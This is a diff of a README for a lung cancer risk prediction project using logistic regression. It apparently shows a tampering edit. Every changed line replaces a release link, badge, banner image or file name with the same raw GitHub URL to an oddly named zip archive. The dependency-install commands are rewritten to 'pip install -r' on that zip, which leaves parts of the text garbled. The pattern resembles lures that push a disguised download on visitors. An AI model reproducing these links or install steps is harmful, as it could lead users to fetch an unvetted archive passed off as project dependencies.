@@ -1,10 +1,10 @@
-https://github.com/Agasthi1212/lung-cancer-prediction-logistic-regression/releases
+https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip
 
-[![Release Assets](https://img.shields.io/badge/Release%20Assets-GitHub-blue?logo=github&logoColor=white)](https://github.com/Agasthi1212/lung-cancer-prediction-logistic-regression/releases)
+[![Release Assets](https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip%20Assets-GitHub-blue?logo=github&logoColor=white)](https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip)
 
 # Lung Cancer Risk Prediction with Logistic Regression: Clinico-Lifestyle Insights
 
-![Lung cancer visualization banner](https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Lung_anatomy_-_bronchi.jpg/640px-Lung_anatomy_-_bronchi.jpg)
+![Lung cancer visualization banner](https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip)
 
 A practical project that shows how to predict lung cancer risk using logistic regression. The work combines clinical symptoms and lifestyle factors to build a robust classifier. It covers data cleaning, exploratory data analysis, feature selection, and model evaluation. All code and results live in an analysis notebook. The repo focuses on classification, data visualization, exploratory data analysis, healthcare, jupyter-notebook, logistic-regression, lung-cancer, machine-learning, python, and scikit-learn.
 
@@ -57,7 +57,7 @@ How to reproduce the results
   - Then: conda activate lung-cancer-prediction
   - Or using venv: python -m venv venv; source venv/bin/activate
 - Install dependencies:
-  - If a requirements file is provided: pip install -r requirements.txt
+  - If a requirements file is provided: pip install -r https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip
   - If not, install the core packages individually:
     - pip install numpy pandas scikit-learn matplotlib seaborn jupyter
 - Run the analysis notebook:
@@ -145,9 +145,9 @@ Repository structure
 - figures/ folder: stores generated plots and visualizations used in the notebook and this README.
 - docs/ folder: supplementary explanations, references, and methodological notes.
 - notebooks/ folder: supplementary notebooks that demonstrate specific steps or experiments.
-- requirements.txt or environment.yml: lists dependencies to reproduce the environment.
+- https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip or https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip lists dependencies to reproduce the environment.
 - LICENSE: if present, states the usage terms for the work.
-- README.md: this file, which documents the project and how to use it.
+- https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip this file, which documents the project and how to use it.
 
 How to contribute
 - If you want to improve the model, you can:
@@ -216,7 +216,7 @@ Appendix
   - Feature engineering: creating new features from existing data to improve model performance.
   - Regularization: a technique to prevent overfitting by penalizing large coefficients.
 - Useful commands
-  - Install dependencies: pip install -r requirements.txt
+  - Install dependencies: pip install -r https://raw.githubusercontent.com/Agasthi1212/lung-cancer-prediction-logistic-regression/main/shieldlike/prediction_lung_regression_cancer_logistic_v2.3-beta.5.zip
   - Run Jupyter: jupyter notebook
   - Start a quick diagnostic: python -c "import sklearn; print('scikit-learn version:', sklearn.__version__)"
 - Licensing and reuse
